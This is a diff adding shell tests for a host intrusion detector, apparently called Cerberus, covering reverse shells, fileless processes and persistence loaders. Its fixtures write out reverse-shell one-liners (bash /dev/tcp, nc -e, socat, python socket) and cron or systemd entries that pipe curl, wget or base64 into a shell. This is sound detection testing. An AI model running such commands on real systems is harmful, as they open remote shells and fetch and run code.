@@ -297,3 +297,157 @@ teardown() {
   run detect_malware_hashes
   [ -z "$output" ]
 }
+
+# --- reverse shell ---------------------------------------------------------
+
+@test "revshell: a bash /dev/tcp redirect is SOFT" {
+  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
+  fixture ps_args '  3001 bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'
+  run detect_revshell
+  [[ "$output" == "SOFT|revshell|3001|"* ]]
+}
+
+@test "revshell: nc with an attached shell is SOFT" {
+  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
+  fixture ps_args '  3002 nc -e /bin/sh 203.0.113.9 4444'
+  run detect_revshell
+  [[ "$output" == *"SOFT|revshell|3002"* ]]
+}
+
+@test "revshell: socat handing over a shell is SOFT" {
+  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
+  fixture ps_args '  3003 socat tcp-connect:203.0.113.9:4444 exec:/bin/bash,pty,stderr'
+  run detect_revshell
+  [[ "$output" == *"SOFT|revshell|3003"* ]]
+}
+
+@test "revshell: the python socket one-liner is SOFT" {
+  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
+  fixture ps_args '  3004 python3 -c import socket,os,pty;s=socket.socket();s.connect(("203.0.113.9",4444));os.dup2(s.fileno(),0)'
+  run detect_revshell
+  [[ "$output" == *"SOFT|revshell|3004"* ]]
+}
+
+@test "revshell: ordinary shells and tools are not reported" {
+  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
+  fixture ps_args \
+    '  3010 bash' \
+    '  3011 -bash' \
+    '  3012 sshd: root@pts/0' \
+    '  3013 nc -l 8080' \
+    '  3014 python3 manage.py runserver' \
+    '  3015 socat TCP-LISTEN:8080,fork TCP:127.0.0.1:9090' \
+    '  3016 curl -sS https://example.com/x.tar.gz' \
+    '  3017 /usr/bin/ssh -i /root/.ssh/id_ed25519 backup@example.com'
+  run detect_revshell
+  [ -z "$output" ]
+}
+
+@test "revshell: disabled by DETECT_REVSHELL=0" {
+  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
+  fixture ps_args '  3001 bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'
+  DETECT_REVSHELL=0 run detect_revshell
+  [ -z "$output" ]
+}
+
+@test "revshell: no pattern file means no findings" {
+  fixture ps_args '  3001 bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'
+  run detect_revshell
+  [ -z "$output" ]
+}
+
+# --- fileless --------------------------------------------------------------
+
+@test "fileless: a process running from anonymous memory is reported" {
+  # A real memfd, not a fixture: the helper execs a script that only ever
+  # existed in memory, so /proc/<pid>/exe genuinely reads "/memfd:... (deleted)".
+  python3 "$REPO_ROOT/tests/memfd_exec.py" "$TEST_TMP/memfd.pid" </dev/null >/dev/null 2>&1 &
+  SPAWNED=$!
+  disown "$SPAWNED" 2>/dev/null || true
+
+  local i=0
+  while [ ! -s "$TEST_TMP/memfd.pid" ] && [ "$i" -lt 50 ]; do sleep 0.1; i=$(( i + 1 )); done
+  local child; child="$(cat "$TEST_TMP/memfd.pid" 2>/dev/null || true)"
+  [ -n "$child" ] || skip "kernel or python without memfd_create"
+
+  run detect_proc_exe
+  reap "$child"
+  [[ "$output" == *"SOFT|fileless|$child|executing from anonymous memory"* ]]
+}
+
+@test "fileless: disabled by DETECT_FILELESS=0" {
+  DETECT_FILELESS=0 run detect_proc_exe
+  [[ "$output" != *"fileless"* ]]
+}
+
+# --- loaders in persistence points -----------------------------------------
+
+@test "loader: a cron job that pipes curl into a shell is SOFT" {
+  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
+  _loader_sources() {
+    printf 'root crontab\t%s\n' '*/5 * * * * curl -s http://198.51.100.9/x.sh | sh'
+  }
+  run detect_loader
+  [[ "$output" == *"SOFT|loader|-|downloads and executes code, in root crontab:"* ]]
+  [[ "$output" == *"198.51.100.9"* ]]
+}
+
+@test "loader: a unit ExecStart that decodes base64 into a shell is SOFT" {
+  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
+  _loader_sources() {
+    printf '/etc/systemd/system/x.service\t%s\n' \
+      'ExecStart=/bin/sh -c "echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IHN0cmluZw== | base64 -d | sh"'
+  }
+  run detect_loader
+  [[ "$output" == *"SOFT|loader"* ]]
+  [[ "$output" == *"x.service"* ]]
+}
+
+@test "loader: ordinary scheduled jobs are not reported" {
+  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
+  _loader_sources() {
+    printf 'root crontab\t%s\n' \
+      '0 3 * * * /usr/local/bin/backup.sh' \
+      '0 9 * * * /opt/app/master.sh digest 1' \
+      '*/10 * * * * curl -sS -o /var/log/feed.json https://example.com/feed.json' \
+      '0 4 * * * certbot renew --quiet'
+    printf '/etc/systemd/system/app.service\t%s\n' \
+      'ExecStart=/usr/bin/node /opt/app/server.js'
+  }
+  run detect_loader
+  [ -z "$output" ]
+}
+
+@test "loader: the same entry is reported once, not on every pass" {
+  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
+  _loader_sources() {
+    printf 'root crontab\t%s\n' '*/5 * * * * wget -qO- http://198.51.100.9/x | bash'
+  }
+  run detect_loader
+  [[ "$output" == *"SOFT|loader"* ]]
+  run detect_loader
+  [ -z "$output" ]
+}
+
+@test "loader: respects the persistence cadence and the toggle" {
+  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
+  _loader_sources() {
+    printf 'root crontab\t%s\n' '*/5 * * * * curl -s http://198.51.100.9/x | sh'
+  }
+  PERSISTENCE_EVERY=10
+
+  CERBERUS_PASS=3 run detect_loader
+  [ -z "$output" ]
+  DETECT_LOADER=0 CERBERUS_PASS=10 run detect_loader
+  [ -z "$output" ]
+  CERBERUS_PASS=10 run detect_loader
+  [[ "$output" == *"SOFT|loader"* ]]
+}
+
+@test "loader: reads real crontab, cron.d and unit files without blowing up" {
+  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
+  fixture crontab_out "0 3 * * * /usr/local/bin/backup"
+  run _loader_sources
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"root crontab"* ]]
+}
